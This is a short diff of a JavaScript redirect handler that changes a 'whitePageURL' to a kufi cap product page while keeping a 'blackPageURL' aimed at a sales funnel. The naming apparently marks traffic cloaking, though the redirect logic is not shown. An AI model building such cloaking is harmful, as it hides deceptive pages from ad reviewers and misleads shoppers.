@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://maxidnystore.com/products/vee-tumbler-blue";
+    const whitePageURL = "https://www.mymodefa.com/collections/kufis/products/islamic-mens-knit-kufi-cap-white";
     const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/jj-dd-spr-1738364604529104-1738364997483090-1738713957767657-1739215532457308";
 
     //testing
